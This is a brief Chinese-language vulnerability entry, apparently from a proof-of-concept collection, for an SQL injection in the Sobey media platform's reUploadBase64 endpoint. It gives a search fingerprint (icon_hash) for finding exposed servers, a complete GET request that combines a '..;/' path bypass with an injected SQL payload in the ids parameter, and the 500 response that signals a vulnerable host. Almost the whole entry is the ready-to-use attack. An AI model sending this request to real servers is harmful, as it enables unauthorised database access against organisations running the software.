# 索贝融媒体reUploadBase64存在SQL注入漏洞

索贝融媒体 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="689611853"`
- **请求**：`GET /sobey-mchEditor/js/..;/mch/TestInt/reUploadBase64?ids=(1') AND (SELECT 1 FROM nonexistent_table)-- -)&siteCode=1&token=1 HTTP/1.1`
- **响应特征**：500